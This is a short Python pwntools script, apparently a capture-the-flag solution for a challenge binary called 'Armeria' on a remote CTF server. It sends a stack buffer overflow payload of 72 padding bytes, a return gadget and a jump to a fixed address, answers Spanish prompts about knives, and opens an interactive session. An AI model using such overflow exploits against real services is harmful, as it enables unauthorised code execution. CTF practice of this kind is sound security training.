from pwn import *

#p = process("./Armeria")
p = remote("challs.caliphalhounds.com", 26133)

payload = b'A' * 72 + p64(0x0000000000401016) + p64(0x401262)
print(payload)
p.sendlineafter(" mi favorita.",b"navaja")

p.sendlineafter("decirme cual es tu modelo favorito de navaja?", payload)

p.interactive()
